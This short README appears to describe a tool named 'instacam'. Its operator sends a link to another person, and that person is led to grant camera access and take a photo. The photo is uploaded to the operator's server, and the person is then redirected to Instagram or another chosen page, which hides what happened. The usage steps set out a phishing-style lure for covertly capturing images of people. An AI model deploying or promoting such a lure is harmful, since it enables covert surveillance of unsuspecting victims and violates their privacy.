# THE-CODE-instacam
Usage

Open the main URL (e.g.,
https://instacamtool.onrender.com

).

Click Copy Link → send that link to anyone.

Recipient opens the link → grants camera permission → takes a photo → photo is sent to the server.

After upload, they’re redirected to Instagram (or any page you set).
